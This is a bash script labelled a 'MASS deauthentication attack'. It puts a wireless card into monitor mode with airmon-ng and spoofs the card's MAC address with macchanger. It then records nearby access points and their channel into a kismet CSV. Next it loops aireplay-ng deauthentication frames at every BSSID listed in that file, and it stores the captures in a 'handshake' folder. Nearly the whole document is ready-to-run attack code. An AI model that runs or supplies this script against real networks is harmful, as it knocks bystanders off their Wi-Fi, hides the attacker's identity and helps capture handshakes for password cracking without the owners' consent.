#!/bin/bash
#Creator: David Parra-Sandoval
#Date: 3/8/2020
#Last Modified Date: 5/18/2020
clear

if [[ ${UID} -ne 0 ]]; then
echo "Please run as root or sudo"
exit 1
else echo "Welcome $USER"
echo "MASS deauthentication attack"
sleep 2
echo "Only single channel, for Multi channel run MassDeauthALLch.sh in DeauthMultiCH directory."
sleep 4

fi
wifi=$(ip a | grep wl | head -1 | cut -d ":" -f 2)
sudo airmon-ng start $wifi 
clear
wlan0=$(ip a | grep wl | head -1 | cut -d ":" -f 2)
sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up
clear

kismetcap () {
exec xterm -hold -e sudo airodump-ng $wlan0 &
read -p "Name of kismet.csv?:" KISMET
read -p "Channel#:" CHANNEL
xterm -e sudo airodump-ng -c $CHANNEL --output-format kismet -w $KISMET $wlan0
wait
if [[ -d $HOME/handshake ]]; then
mv $KISMET*.kismet.csv $HOME/handshake
else mkdir $HOME/handshake && mv $KISMET*.kismet.csv $HOME/handshake
fi
clear
}

kismetatt () {
if [[ -d $HOME/handshake ]]; then
cd $HOME/handshake/
fi
ls 	
echo -------------------------------------------------------------
read -p "Copy/Paste *.kismet.csv list to attack from above:" BSSID 
read -p "Deauthentication count:" COUNT

MAC=$(cat $BSSID | awk -F ";" '{print $4}' | tail +2)
CH=$(cat $BSSID | awk -F ";" '{print $6}' | tail +2)

xterm -e sudo airodump-ng -c $CH $wlan0 &
sleep 1
kill $!

for MASS in $MAC ; do
sudo aireplay-ng --deauth $COUNT -a $MASS $wlan0 
done
clear
}

while true; do
echo -e "\tMenu"
echo "-------------------"
echo "1.Kismet Capture"
echo "2.Kismet Attack" 
echo "3.Exit"          
echo "-------------------"
read -p "#:" input
clear
case $input in
1) kismetcap;;
2) kismetatt;;
3) break;;
*) echo "NOPE";;
esac
done

echo "Remove handshake folder?:"
read REMOVE
if [[ $REMOVE = [yY]* ]]; then
sudo rm -r $HOME/handshake
elif [[ $REMOVE = [nN]* ]]; then
echo "Goodbye!"
sleep=3
fi

sudo airmon-ng stop $wlan0 
sudo ip link set $wifi down && sudo ip link set $wifi up 
clear
